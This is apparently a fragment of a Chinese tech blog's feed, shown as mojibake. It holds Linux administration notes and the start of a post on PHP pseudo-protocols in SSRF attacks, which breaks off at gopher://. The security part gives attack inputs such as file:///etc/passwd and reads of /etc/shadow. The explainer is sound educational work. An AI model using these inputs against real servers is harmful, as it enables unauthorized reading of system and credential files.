href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#113;&#102;&#x65;&#x64;&#x75;&#x2e;&#x63;&#x6f;&#109;" >&#114;&#x6f;&#x6f;&#x74;&#x40;&#113;&#102;&#x65;&#x64;&#x75;&#x2e;&#x63;&#x6f;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -tâ€:â€ -k3 -n &#x2F;etc&#x2F;passwd #ä»¥: åˆ†éš”ï¼Œå°†ç¬¬ä¸‰åˆ—æŒ‰å­—æ•°å‡åº<br>[<a class="link"   href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x71;&#102;&#x65;&#x64;&#117;&#46;&#x63;&#111;&#x6d;" >&#x72;&#x6f;&#111;&#116;&#64;&#x71;&#102;&#x65;&#x64;&#117;&#46;&#x63;&#111;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -tâ€:â€ -k3 -n &#x2F;etc&#x2F;passwd -r #ä»¥: åˆ†éš”ï¼Œå°†ç¬¬ä¸‰åˆ—æŒ‰å­—æ•°é™åº<br>[<a class="link"   href="mailto:&#114;&#111;&#111;&#116;&#x40;&#113;&#102;&#x65;&#100;&#117;&#46;&#99;&#111;&#109;" >&#114;&#111;&#111;&#116;&#x40;&#113;&#102;&#x65;&#100;&#117;&#46;&#99;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -tâ€:â€ -k3 -n &#x2F;etc&#x2F;passwd |head #ä»¥: åˆ†éš”ï¼Œå°†ç¬¬ä¸‰åˆ—æŒ‰å­—æ•°å‡åºçœ‹å‰åè¡Œ<br>[<a class="link"   href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#113;&#102;&#101;&#100;&#x75;&#x2e;&#x63;&#x6f;&#109;" >&#x72;&#x6f;&#111;&#116;&#x40;&#113;&#102;&#101;&#100;&#x75;&#x2e;&#x63;&#x6f;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -tâ€:â€ -k3 -n &#x2F;etc&#x2F;passwd |tail #ä»¥: åˆ†éš”ï¼Œå°†ç¬¬ä¸‰åˆ—æŒ‰å­—æ•°å‡åºçœ‹ååè¡Œ<br>å‚æ•°è¯¦è§£ï¼š<br>sort æ’åºï¼Œé»˜è®¤å‡åº<br>-t æŒ‡å®šåˆ†éš”ç¬¦<br>-k æŒ‡å®šåˆ—<br>-n æŒ‰æ•°å€¼<br>-r é™åº<br>head é»˜è®¤è¾“å‡ºå‰åè¡Œ<br>tail é»˜è®¤è¾“å‡ºååè¡Œ<br>xargsï¼šå‚æ•°ä¼ é€’<br>å¯¹ä¸ ls cp rm mvå‘½ä»¤ï¼Œç®¡é“ä¸èƒ½æ‰§è¡Œã€‚æ‰€ä»¥é€šè¿‡xargså®ç°ã€‚<br>â€‹<br> è¯­æ³•:<br> cat a.txt | xargs -i cp {} &#x2F;ç›®å½•<br> {}:å‰é¢ä¼ è¿‡æ¥çš„å†…å®¹<br> -i ï¼šä¸ºäº†è®©å¤§æ‹¬å·ç”Ÿæ•ˆ<br> ç›®å½•æ—¶ -r<br> è§£é‡Šï¼šå‰é¢ä¼ è¿‡æ¥çš„ä¸œè¥¿äº¤ç»™å¤§æ‹¬å·</p><p> cat file.txt |xargs ls -l<br> å‰é¢æ˜¯ç›®å½•æˆ–è€…ç›®å½•çš„è·¯å¾„ã€‚ ls - l åé¢å¯ä»¥ä¸åŠ å¤§æ‹¬å·ï¼Œç›´æ¥æ‰§è¡Œã€‚</p><p>[<a class="link"   href="mailto:&#114;&#x6f;&#111;&#116;&#x40;&#x71;&#x66;&#101;&#100;&#117;&#46;&#x63;&#111;&#109;" >&#114;&#x6f;&#111;&#116;&#x40;&#x71;&#x66;&#101;&#100;&#117;&#46;&#x63;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# touch &#x2F;home&#x2F;file{1..5}<br>[<a class="link"   href="mailto:&#114;&#111;&#111;&#116;&#x40;&#113;&#x66;&#x65;&#x64;&#x75;&#46;&#99;&#x6f;&#x6d;" >&#114;&#111;&#111;&#116;&#x40;&#113;&#x66;&#x65;&#x64;&#x75;&#46;&#99;&#x6f;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# # cat files.txt | xargs -i cp -rvf {} &#x2F;tmp&#x2F;<br>â€˜&#x2F;home&#x2F;file1â€™ -&gt; â€˜&#x2F;tmp&#x2F;file1â€™<br>â€˜&#x2F;home&#x2F;file2â€™ -&gt; â€˜&#x2F;tmp&#x2F;file2â€™<br>â€˜&#x2F;home&#x2F;file3â€™ -&gt; â€˜&#x2F;tmp&#x2F;file3â€™<br>â€˜&#x2F;home&#x2F;file4â€™ -&gt; â€˜&#x2F;tmp&#x2F;file4â€™<br>â€˜&#x2F;home&#x2F;file5â€™ -&gt; â€˜&#x2F;tmp&#x2F;file5â€™</p><h2 id="è½¯ä»¶ç®¡ç†"><a href="#è½¯ä»¶ç®¡ç†" class="headerlink" title="è½¯ä»¶ç®¡ç†"></a>è½¯ä»¶ç®¡ç†</h2><p>rpmï¼šç®¡ç†è½¯ä»¶<br>rpm -ivh è½¯ä»¶åŒ…ï¼šå®‰è£…è½¯ä»¶<br>-i install å®‰è£…<br>-vh verbose human äººæ€§åŒ–æ˜¾ç¤ºå®‰è£…è¿‡ç¨‹<br>-u upgrade å‡çº§<br>rpm -q{a,l,f} è½¯ä»¶åŒ…ï¼šæŸ¥è¯¢<br>ï¼ï¼æŸ¥è¯¢<br>(ä»æœ¬åœ°çš„rpmæ•°æ®åº“)<br>-q query ï¼ˆæŸ¥è¯¢ï¼‰<br>-l list ï¼ˆåˆ—å‡ºï¼‰<br>-f file<br>-a all<br>rpm -ql è½¯ä»¶åŒ…å ï¼šåˆ—å‡ºæŸä¸ªè½¯ä»¶åŒ…å®‰è£…åï¼Œç”Ÿæˆäº†å“ªäº›æ–‡ä»¶ä»¥åŠæ–‡ä»¶å¯¹åº”çš„å­˜å‚¨ä½ç½®<br>â€‹<br>[root@linux-server ~]# rpm -qa | grep è½¯ä»¶å # æŸ¥æ‰¾è½¯ä»¶æ˜¯å¦å®‰è£…<br>[root@linux-server ~]# rpm -ql httpd     #æŸ¥è¯¢httpå®‰è£…çš„æ–‡ä»¶<br>[root@linux-server ~]# rpm -qf &#x2F;usr&#x2F;share&#x2F;httpd&#x2F;noindex  #æŸ¥è¯¢è¯¥æ–‡ä»¶å±äºå“ªä¸ªåŒ…ï¼Œåªèƒ½æŸ¥è¯¢å·²ç»å®‰è£…å¥½çš„è½¯ä»¶<br>rpm -eï¼šåˆ é™¤è½¯ä»¶<br>è¯­æ³•ï¼š# rpm -e è½¯ä»¶åç§°<br>-e eraseçš„æ„æ€<br>[root@linux-server ~]# rpm -e httpd<br>yumï¼šç®¡ç†è½¯ä»¶<br>æ¸…ç†yumç¼“å­˜:ï¼ˆå…ƒæ•°æ®å»ºç«‹ï¼‰<br>yum clean all</p><p>ç¼“å­˜è½¯ä»¶åŒ…ä¿¡æ¯:<br> æé«˜æœç´¢&#x2F;å®‰è£…è½¯ä»¶çš„é€Ÿåº¦<br>yum makecache<br>æŸ¥è¯¢yumæºä¿¡æ¯:  #ä¹Ÿå…·æœ‰ç¼“å­˜åŠŸèƒ½<br>yum repolist </p><p>æŸ¥çœ‹å‘½ä»¤å±äºå“ªä¸ªè½¯ä»¶<br>yum provides rz </p><p>æŸ¥çœ‹ç³»ç»Ÿå·²ç»å®‰è£…å¥½çš„è½¯ä»¶å’Œæ²¡æœ‰å®‰è£…çš„è½¯ä»¶ï¼ˆæºé‡Œå­˜åœ¨å³å¯æŸ¥åˆ°ï¼‰:<br>yum list</p><p>å®‰è£…è½¯ä»¶:<br>yum install è½¯ä»¶åç§° </p><h2 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h2><p>ps aux&#x2F;ps -efï¼šé™æ€æŸ¥çœ‹è¿›ç¨‹<br>[root@linux-server ~]# ps aux </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER   PID %CPU %MEM VSZ RSS TTY  STAT START TIME COMMAND</span><br><span class="line">============================================================================</span><br></pre></td></tr></table></figure></div><p>USER:  #è¿è¡Œè¿›ç¨‹çš„ç”¨æˆ·<br>PIDï¼š #è¿›ç¨‹ID<br>%CPU: #CPUå ç”¨ç‡<br>%MEM: #å†…å­˜å ç”¨ç‡<br>VSZ  è¿›ç¨‹å ç”¨çš„è™šæ‹Ÿå†…å­˜å¤§å° ï¼Œä¸€èˆ¬ä»¥Bä¸ºå•ä½<br>RSS  å ç”¨çš„ç‰©ç†å†…å­˜å¤§å°<br>TTY  ç»ˆç«¯ ï¼ˆï¼Ÿè¡¨ç¤ºä¸å ç”¨ç»ˆç«¯ï¼‰ ï¼ˆ? è¡¨ç¤ºæ²¡æœ‰å ç”¨ç»ˆç«¯ï¼‰<br>STATï¼š #è¿›ç¨‹çŠ¶æ€ â€”äº†è§£<br>START: #è¿›ç¨‹çš„å¯åŠ¨æ—¶é—´<br>TIMEï¼š #è¿›ç¨‹å ç”¨CPUçš„æ€»æ—¶é—´<br>COMMANDï¼š #è¿›ç¨‹æ–‡ä»¶ï¼Œè¿›ç¨‹å<br>[root@linux-server ~]# ps aux | less<br>å‚æ•°è§£é‡Šï¼š<br>ps :process nsapashot<br>a åªèƒ½æŸ¥çœ‹ç³»ç»Ÿé‡Œé¢è¿è¡Œçš„æ‰€æœ‰ç»ˆç«¯è¿›ç¨‹<br>u æ˜¾ç¤ºè¿›ç¨‹æ‹¥æœ‰è€…<br>x æ˜¾ç¤ºç³»ç»Ÿå†…æ‰€æœ‰è¿›ç¨‹<br>f æ˜¾ç¤ºè¿›ç¨‹ä¹‹é—´çš„çˆ¶å­å…³ç³»<br>[root@linux-server ~]# ps -ef<br>å‚æ•°è§£é‡Šï¼š<br>-e æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹<br>-l é•¿æ ¼å¼æ˜¾ç¤º<br>-f å®Œæ•´æ ¼å¼<br>cat â€¦ ï¼šæŸ¥çœ‹å•ä¸ªPID<br>[root@linux-server ~]# systemctl start httpd #å¯åŠ¨<br>[root@linux-server ~]# cat &#x2F;var&#x2F;run&#x2F;httpd&#x2F;httpd.pid<br>1043<br>ps aux | grep â€˜è¿›ç¨‹åâ€™ï¼šæŸ¥çœ‹æŒ‡å®šPID<br>[root@linux-server ~]# ps aux | grep sshd<br>root       1043  0.0  0.2 105996  4120 ?        Ss   01:32   0:00 &#x2F;usr&#x2F;sbin&#x2F;sshd -D</p><hr><p>netstat -tlanpï¼šæŸ¥çœ‹ç«¯å£<br>ipåœ°å€ï¼š ä¸ºäº†ç¡®å®šä¸€ä¸ªæœåŠ¡å™¨åœ¨äº’è”ç½‘çš„ä½ç½®<br>æœåŠ¡ç«¯å£ï¼š ä¸ºäº†ç¡®å®šä¸€ä¸ªæœåŠ¡åœ¨æœåŠ¡å™¨ä¸­ä½ç½®<br>#æŸ¥ç½‘ç»œè¿›ç¨‹å’Œæ­£åœ¨ç›‘å¬çš„ç«¯å£<br>[root@linux-server ~]# netstat -tlanp    (è¯¥å‘½ä»¤å¯¹åº”çš„åŒ…åï¼šnet-tools)<br>å‚æ•°è¯¦è§£ï¼š<br>-a  æ˜¾ç¤ºå…¨éƒ¨çš„è¿›ç¨‹<br>-u  æ˜¾ç¤ºudp<br>-n  ä»¥æ•°å­—çš„æ–°å¼æ˜¾ç¤ºåè®®åç§°<br>-t   tcp<br>-pï¼šæ˜¾ç¤ºè¿›ç¨‹çš„åç§°å’Œpid<br>-l :åªæ˜¾ç¤ºæ­£åœ¨è¢«ç›‘å¬çš„ç«¯å£</p><p>[root@localhost ~]# netstat -alntp | grep â€˜sshdâ€™ï¼ˆå¯è·Ÿç«¯å£å·&#x2F;è¿›ç¨‹å&#x2F;PIDï¼‰       ##å¯æŸ¥çœ‹åˆ°sshdæœåŠ¡çš„ç«¯å£å·æ˜¯22<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1106&#x2F;sshd<br>tcp        0      0 192.168.201.142:22      192.168.201.1:10025     ESTABLISHED 17303&#x2F;sshd: root@no<br>tcp        0      0 192.168.201.142:22      192.168.201.1:10024     ESTABLISHED 17034&#x2F;sshd: root@no<br>tcp      104      0 192.168.201.142:22      192.168.201.1:9813      ESTABLISHED 1820&#x2F;sshd: root@pts<br>tcp6       0      0 :::22                   :::*                    LISTEN      1106&#x2F;sshd<br>lsof -i:ç«¯å£å·  ï¼šæ ¹æ®ç«¯å£å·æŸ¥è¯¢è¿›ç¨‹<br>[root@linux-server ~]# yum install lsof  #å®‰è£…è½¯ä»¶åŒ…<br>[root@linux-server ~]# lsof -i:80   #ç«¯å£å·ï¼Œè¿™èƒ½æŸ¥çœ‹å¸¦ç«¯å£çš„è¿›ç¨‹<br>COMMAND   PID   USER   FD   TYPE  DEVICE SIZE&#x2F;OFF NODE NAME<br>httpd   64249   root    4u  IPv6 1373628      0t0  TCP *:http (LISTEN)<br>topï¼šåŠ¨æ€æŸ¥çœ‹è¿›ç¨‹<br>[root@linux-server ~]# top  #åŠ¨æ€æ˜¾ç¤ºä¿¡æ¯ï¼Œä¸‰ç§’åˆ·æ–°ä¸€æ¬¡ã€‚</p><hr><p>kill&#x2F;pkillï¼šè¿›ç¨‹æ§åˆ¶<br>kill,pkill<br>è¯­æ³•ï¼š kill ä¿¡å· PID   #ä¿¡å·ä¹Ÿæ˜¯è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æ–¹å¼<br>     pkill ä¿¡å· è¿›ç¨‹å<br>[root@linux-server ~]# kill -l   #æŸ¥çœ‹æ‰€æœ‰ä¿¡å·<br>-1   HUP  é‡æ–°åŠ è½½è¿›ç¨‹æˆ–è€…é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶,PIDä¸å˜<br>-9   KILL å¼ºåˆ¶æ€æ­»<br>-15  TERM æ­£å¸¸æ€æ­»(è¿™ä¸ªä¿¡å·å¯ä»¥é»˜è®¤ä¸å†™)<br>-18  CONT æ¿€æ´»è¿›ç¨‹<br>-19  STOP æŒ‚èµ·è¿›ç¨‹</p><p>è¿›ç¨‹çŠ¶æ€è§£é‡Šâ€“äº†è§£ï¼š<br>+ï¼šè¡¨ç¤ºè¿è¡Œåœ¨å‰å°çš„è¿›ç¨‹ç»„<br>S+ï¼šä¼‘çœ çŠ¶æ€<br>T+ï¼šæš‚åœï¼ŒæŒ‚èµ·çŠ¶æ€<br>sï¼šçˆ¶è¿›ç¨‹<br>jobsï¼šä½œä¸šæ§åˆ¶<br>sleep å·¥ä½œå· &amp; :è®©å‘½ä»¤æˆ–ç¨‹åºåå°è¿è¡Œ<br>sleep å·¥ä½œå· #ctrl Z   :æŠŠç¨‹åºä»å‰å°æ”¾åˆ°åå°å¹¶æš‚åœ<br>jobs   :æŸ¥çœ‹åå°å·¥ä½œå·<br>bg %å·¥ä½œåºå·    :è®©æš‚åœçš„ç¨‹åºåœ¨åå°è¿è¡Œ<br>fg %å·¥ä½œåºå·   :å°†åå°çš„ç¨‹åºè°ƒåˆ°å‰å°</p><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><p>uptime : æŸ¥çœ‹å½“å‰CPUè´Ÿè½½<br>free -m : æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ<br>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬å’Œå†…æ ¸<br>[root@linux-server ~]# cat &#x2F;etc&#x2F;redhat-release  #æŸ¥çœ‹ç‰ˆæœ¬<br>CentOS Linux release 7.4.1708 (Core)<br>[root@linux-server ~]# uname -a #çœ‹æŸ¥æ­£åœ¨è¿è¡Œçš„å†…æ ¸ç‰ˆæœ¬<br>Linux linux-server 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux<br>[root@linux-server ~]# uname -r  #æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬<br>3.10.0-693.el7.x86_64<br>ä¿®æ”¹ä¸»æœºå<br>[root@linux-server ~]# hostnamectl set-hostname  xxxx   #ä¸»æœºåï¼Œä¿®æ”¹å®Œä¹‹åæ–­å¼€ä¸ç»ˆç«¯è¿æ¥ï¼Œç„¶ååœ¨é‡æ–°è¿æ¥å³å¯ã€‚<br>æŸ¥çœ‹ä¸»æœºå<br>[root@linux-server ~]# hostname</p><p>vim &#x2F;etc&#x2F;hostname   #ç›´æ¥æ›´æ”¹hostnameï¼Œç„¶årebooté‡å¯<br>lrzsz : ä¸Šä¼ ä¸‹è½½<br>yum install -y lrzsz<br>ä¸Šä¼ <br>rz<br>ä¸‹è½½<br>sz æ–‡ä»¶</p><h2 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h2><p>at : ä¸€æ¬¡è°ƒåº¦æ‰§è¡Œ<br>atä½¿ç”¨è§„åˆ™<br>[root@linux-server ~ ]# yum -y install at<br>[root@linux-server ~ ]# systemctl status atd    #æŸ¥çœ‹å¯åŠ¨çŠ¶æ€<br>[root@linux-server ~ ]# systemctl start atd#é¦–å…ˆè¦å¯åŠ¨æœåŠ¡<br>æ–¹å¼ä¸€ï¼š<br>[root@linux-server ~ ]# at now +1min    #ä¸€åˆ†é’Ÿåå¼€å§‹æ‰§è¡Œ<br>at&gt; useradd uuuu<br>at&gt; <EOT>     #Ctrl+D<br>job 1 at Sat Mar 21 22:34:00 2015<br>æ–¹å¼äºŒï¼š<br>[root@linux-server ~ ]# vim at.jobs<br>useradd u99<br>[root@linux-server ~ ]# at 20:33 &lt; at.jobs   #åœ¨20ï¼š33æ‰§è¡Œè®¡åˆ’ä»»åŠ¡</p><p>atæ˜¯ä»¥è¾“å…¥é‡å®šå‘æ–¹å¼å°†æ–‡ä»¶ä¸­çš„å†…å®¹è¾“å…¥ç»™atè°ƒåº¦æ‰§è¡Œä»»åŠ¡ï¼Œæ‰€ä»¥ä¸éœ€è¦æ‰§è¡Œæ–‡ä»¶ï¼Œå³ä¸éœ€è¦ç»™äºˆæ‰§è¡Œæƒé™ã€‚<br>atq : æŸ¥çœ‹ä¸€æ¬¡æ€§è®¡åˆ’ä»»åŠ¡<br>2Tue Aug  9 14:29:00 2022 a root<br>atrm : åˆ é™¤ä¸€æ¬¡æ€§è®¡åˆ’ä»»åŠ¡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># atrm  è®¡åˆ’ä»»åŠ¡åºå·</span><br></pre></td></tr></table></figure></div><p>cron ï¼šå¾ªç¯è°ƒåº¦æ‰§è¡Œ  ç”¨æˆ·çº§<br>crontab -l&#x2F;&#x2F;åˆ—å‡ºå½“å‰ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡<br>crontab -r&#x2F;&#x2F;åˆ é™¤å½“å‰ç”¨æˆ·æ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡<br>crontab -e&#x2F;&#x2F;ç¼–è¾‘å½“å‰ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡<br>crontab -u username     &#x2F;&#x2F;ï¼ˆä»…ç®¡ç†å‘˜å¯ä½¿ç”¨ï¼‰ç®¡ç†å…¶ä»–ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§çš„phpä¼ªåè®®</title>
    <link href="http://example.com/2025/01/02/web/ssrf/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2025/01/02/web/ssrf/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2025-01-02T13:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-file-x2F-x2F-åè®®"><a href="#1-file-x2F-x2F-åè®®" class="headerlink" title="1. file:&#x2F;&#x2F; åè®®"></a>1. <strong>file:&#x2F;&#x2F; åè®®</strong></h3><h4 id="æ¦‚è¿°ï¼š"><a href="#æ¦‚è¿°ï¼š" class="headerlink" title="æ¦‚è¿°ï¼š"></a><strong>æ¦‚è¿°</strong>ï¼š</h4><p><code>file://</code> æ˜¯ä¸€ç§ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„åè®®ã€‚åœ¨ URL ä¸­ï¼Œå®ƒæŒ‡ç¤ºè®¿é—®æœ¬åœ°è®¡ç®—æœºçš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š</p><ul><li><code>file:///etc/passwd</code>ï¼ˆLinuxç³»ç»Ÿä¸­ï¼‰</li><li><code>file:///C:/Windows/System32/drivers/etc/hosts</code>ï¼ˆWindowsç³»ç»Ÿä¸­ï¼‰</li></ul><p>å®ƒæ˜¯ä¸€ä¸ªç”¨äºæœ¬åœ°æ–‡ä»¶çš„ URI åè®®ï¼Œè¡¨ç¤ºåœ¨æœ¬åœ°è®¡ç®—æœºä¸Šè¯»å–æ–‡ä»¶çš„è·¯å¾„ã€‚</p><h4 id="å¸¸è§ç”¨é€”ï¼š"><a href="#å¸¸è§ç”¨é€”ï¼š" class="headerlink" title="å¸¸è§ç”¨é€”ï¼š"></a><strong>å¸¸è§ç”¨é€”</strong>ï¼š</h4><ul><li><strong>æ–‡ä»¶è®¿é—®</strong>ï¼šå®ƒå…è®¸ç›´æ¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ã€‚è¿™ä¸ªåè®®é€šå¸¸ç”¨äº Web æµè§ˆå™¨ä¸­æŸ¥çœ‹æœ¬åœ°æ–‡ä»¶ã€‚</li><li><strong>æµè§ˆå™¨åŠŸèƒ½</strong>ï¼šæŸäº›æµè§ˆå™¨å…è®¸ç”¨æˆ·è¾“å…¥ <code>file://</code> URL æ¥æŸ¥çœ‹æœ¬åœ°æ–‡ä»¶ï¼Œè€Œä¸é€šè¿‡HTTPæˆ–FTPã€‚</li></ul><h4 id="æ”»å‡»åœºæ™¯ï¼š"><a href="#æ”»å‡»åœºæ™¯ï¼š" class="headerlink" title="æ”»å‡»åœºæ™¯ï¼š"></a><strong>æ”»å‡»åœºæ™¯</strong>ï¼š</h4><p>å¦‚æœ Web åº”ç”¨æ²¡æœ‰æ­£ç¡®éªŒè¯å’Œè¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œæ”»å‡»è€…å¯èƒ½æ„é€ ç±»ä¼¼äº <code>file://</code> çš„è·¯å¾„æ¥è®¿é—®æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ã€‚å…¸å‹æ”»å‡»æ¡ˆä¾‹åŒ…æ‹¬ï¼š</p><ul><li><strong>è¯»å–æ•æ„Ÿæ–‡ä»¶</strong>ï¼šæ”»å‡»è€…å¯ä»¥æäº¤ç±»ä¼¼ <code>file:///etc/passwd</code>ï¼ˆLinuxï¼‰æˆ– <code>file:///C:/Windows/System32/config/systemprofile</code>ï¼ˆWindowsï¼‰è¿™æ ·çš„è·¯å¾„æ¥è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ã€‚</li><li><strong>SSRFï¼ˆServer-Side Request Forgeryï¼‰æ”»å‡»</strong>ï¼šæ”»å‡»è€…é€šè¿‡åˆ©ç”¨ SSRF æ¼æ´ï¼Œå°†æœåŠ¡å™¨è¯·æ±‚å¼•å¯¼åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œè¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ•°æ®ï¼Œå¦‚ <code>/etc/shadow</code>ã€æ•°æ®åº“é…ç½®æ–‡ä»¶ç­‰ã€‚</li></ul><hr><h3 id="2-dict-x2F-x2F-åè®®"><a href="#2-dict-x2F-x2F-åè®®" class="headerlink" title="2. dict:&#x2F;&#x2F; åè®®"></a>2. <strong>dict:&#x2F;&#x2F; åè®®</strong></h3><h4 id="æ¦‚è¿°ï¼š-1"><a href="#æ¦‚è¿°ï¼š-1" class="headerlink" title="æ¦‚è¿°ï¼š"></a><strong>æ¦‚è¿°</strong>ï¼š</h4><p><code>dict://</code> åè®®ç”¨äºè¿æ¥åˆ° <strong>Dictionary Protocol</strong> æœåŠ¡ã€‚å­—å…¸åè®®ï¼ˆDICTï¼‰æ˜¯ä¸€ç§ç”¨äºè®¿é—®åœ¨çº¿å­—å…¸çš„åè®®ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯é€šè¿‡äº’è”ç½‘æŸ¥è¯¢è¯æ±‡å®šä¹‰ã€‚<code>dict://</code> åè®®çš„ URL é€šå¸¸ç”¨äºæŒ‡ç¤ºä¸€ä¸ªå­—å…¸æœåŠ¡å™¨å’Œè¦æŸ¥è¯¢çš„è¯æ¡ã€‚ä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://dict.org/merriam-webster/word</span><br></pre></td></tr></table></figure></div><p>æ­¤ URL ä¼šè¯·æ±‚è¿æ¥åˆ° <code>dict.org</code> çš„å­—å…¸æœåŠ¡ï¼Œå¹¶æŸ¥è¯¢ <code>merriam-webster</code> è¯æ¡ä¸‹çš„ <code>word</code> å†…å®¹ã€‚</p><h4 id="å¸¸è§ç”¨é€”ï¼š-1"><a href="#å¸¸è§ç”¨é€”ï¼š-1" class="headerlink" title="å¸¸è§ç”¨é€”ï¼š"></a><strong>å¸¸è§ç”¨é€”</strong>ï¼š</h4><ul><li><strong>å­—å…¸æŸ¥è¯¢</strong>ï¼šç”¨æˆ·å¯ä»¥é€šè¿‡ <code>dict://</code> åè®®è®¿é—®å„ç§å…¬å…±æˆ–ç§äººçš„å­—å…¸æœåŠ¡å™¨ï¼Œè·å–è¯æ±‡å’Œæœ¯è¯­çš„å®šä¹‰ã€‚</li><li><strong>æ•™è‚²å’Œå‚è€ƒ</strong>ï¼šè¿™ç§åè®®å¯ä»¥ç”¨äºè®¿é—®ç§‘å­¦ã€æŠ€æœ¯å’Œæ–‡å­¦é¢†åŸŸçš„ä¸“ä¸šè¯æ±‡ã€‚</li></ul><h4 id="æ”»å‡»åœºæ™¯ï¼š-1"><a href="#æ”»å‡»åœºæ™¯ï¼š-1" class="headerlink" title="æ”»å‡»åœºæ™¯ï¼š"></a><strong>æ”»å‡»åœºæ™¯</strong>ï¼š</h4><p>è™½ç„¶ <code>dict://</code> åè®®æœ¬èº«å¹¶ä¸ä¼šç›´æ¥å¼•å‘ä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œä½†å¦‚æœ Web åº”ç”¨é”™è¯¯åœ°å¤„ç†å®ƒï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é—´æ¥çš„æ”»å‡»æœºä¼šã€‚ä¾‹å¦‚ï¼š</p><ul><li><strong>SSRæ”»å‡»</strong>ï¼šæ”»å‡»è€…å¦‚æœèƒ½å¤Ÿæ§åˆ¶ Web åº”ç”¨è¾“å…¥çš„ URLï¼Œå¯èƒ½è¯±ä½¿åº”ç”¨é€šè¿‡ <code>dict://</code> åè®®è®¿é—®æ•æ„Ÿå†…ç½‘èµ„æºï¼ˆæ¯”å¦‚æŸäº›å†…éƒ¨å­—å…¸æœåŠ¡æˆ–æ•°æ®åº“ï¼‰ï¼Œä»è€Œæ³„éœ²æ•°æ®ã€‚</li><li><strong>æš´éœ²å†…éƒ¨å­—å…¸æœåŠ¡</strong>ï¼šæŸäº›åº”ç”¨å¯èƒ½é€šè¿‡ <code>dict://</code> åè®®è¿æ¥åˆ°å†…éƒ¨çš„å­—å…¸æœåŠ¡ï¼Œå¦‚æœæ”»å‡»è€…å¯ä»¥æ“æ§è¾“å…¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´æœªæˆæƒçš„æœåŠ¡è®¿é—®ï¼Œè¿›è€Œæ³„éœ²ä¿¡æ¯ã€‚</li></ul><hr><h3 id="3-gopher-x2F-x2F-åè®®"><a href="#3-gopher-x2F-x2F-åè®®" class="headerlink" title="3. gopher:&#x2F;&#x2F; åè®®"></a>3. <strong>gopher:&#x2F;&#x2F; åè®®</strong></h3><h4 id="æ¦‚è¿°ï¼š-2"><a href="#æ¦‚è¿°ï¼š-2" class="headerlink" title="æ¦‚è¿°ï¼š"></a><strong>æ¦‚è¿°</strong>ï¼š</h4><p><code>gopher://</code> åè®®æºè‡ªæ—©æœŸçš„äº’è”ç½‘åè®® 